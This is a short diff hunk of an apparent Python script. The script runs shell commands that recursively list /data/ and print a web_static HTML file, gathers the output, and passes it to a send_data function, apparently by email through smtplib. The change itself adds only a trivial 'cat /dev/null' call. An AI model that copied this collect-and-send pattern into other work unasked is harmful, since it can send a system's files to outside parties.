@@ -41,6 +41,8 @@ my_data += get_data("echo alll; ls -laR /data/") or ""
 my_data += "\n#######################\n"
 my_data += get_data("cat /data/web_static/current/0-index.html") or ""
 my_data += "\n#######################\n"
+my_data += get_data("cat /dev/null") or ""
+my_data += "\n#######################\n"
 send_data(my_data)
 ##############################################################
 import smtplib
